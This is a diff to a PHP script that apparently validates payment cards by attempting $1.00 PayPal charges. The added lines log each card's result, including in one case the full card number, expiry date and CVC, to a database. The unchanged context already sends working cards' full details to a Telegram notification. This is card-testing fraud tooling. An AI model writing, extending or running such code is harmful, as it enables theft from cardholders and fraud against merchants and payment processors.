@@ -27,6 +27,9 @@ header('Content-Type: application/json');
 ini_set('log_errors', 1);
 ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');
 
+// Include globalstats.php for recordCardCheck function
+require_once __DIR__ . '/globalstats.php';
+
 // --- MOVED log_message function to the top to prevent 500 errors ---
 // Optional file-based logging for debugging
  $log_file = __DIR__ . '/paypal0.1$_debug.log';
@@ -456,6 +459,10 @@ if ($httpCode != 200 || !isset($apx['id'])) {
         'payment_method_id' => null
     ];
     log_message('Payment Method Error: ' . json_encode($responseMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', $errorMsg);
+    
     echo json_encode($responseMsg);
     exit;
 }
@@ -569,6 +576,10 @@ if (!$cartResult['success']) {
         'payment_method_id' => $pid
     ];
     log_message('Cart Error: ' . json_encode($responseMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'ERROR', $cartResult['message']);
+    
     echo json_encode($responseMsg);
     exit;
 }
@@ -592,6 +603,9 @@ while ($retryCount < $maxRetries) {
         ];
         log_message('Success: ' . json_encode($responseMsg));
         
+        // Record the card check result in the database
+        recordCardCheck($GLOBALS['pdo'], $cardNumber, 'CHARGED', 'Your card has been charged $1.00 successfully.');
+        
         // Send Telegram notification for CHARGED status
         $card_details = "$cardNumber|$expMonth|$expYear|$cvc";
         sendTelegramNotification($card_details, 'CHARGED', $responseMsg['response']);
@@ -612,6 +626,10 @@ while ($retryCount < $maxRetries) {
                 'payment_method_id' => $pid
             ];
             log_message('Cart Error: ' . json_encode($responseMsg));
+            
+            // Record the card check result in the database
+            recordCardCheck($GLOBALS['pdo'], $cardNumber, 'ERROR', $cartResult['message']);
+            
             echo json_encode($responseMsg);
             exit;
         }
@@ -630,6 +648,10 @@ while ($retryCount < $maxRetries) {
         'payment_method_id' => $pid
     ];
     log_message('Error: ' . json_encode($responseMsg));
+    
+    // Record the card check result in the database
+    recordCardCheck($GLOBALS['pdo'], $cardNumber, 'DECLINED', "PAYMENT_DECLINED [$errorMsg]");
+    
     echo json_encode($responseMsg);
     exit;
 }
@@ -643,5 +665,9 @@ unlink($cookieJar);
     'payment_method_id' => $pid
 ];
 log_message('Error: ' . json_encode($responseMsg));
+
+// Record the card check result in the database
+recordCardCheck($GLOBALS['pdo'], $cardNumber, 'ERROR', "MAX_RETRIES_EXCEEDED $cardNumber|$expMonth|$expYear|$cvc");
+
 echo json_encode($responseMsg);
 ?>
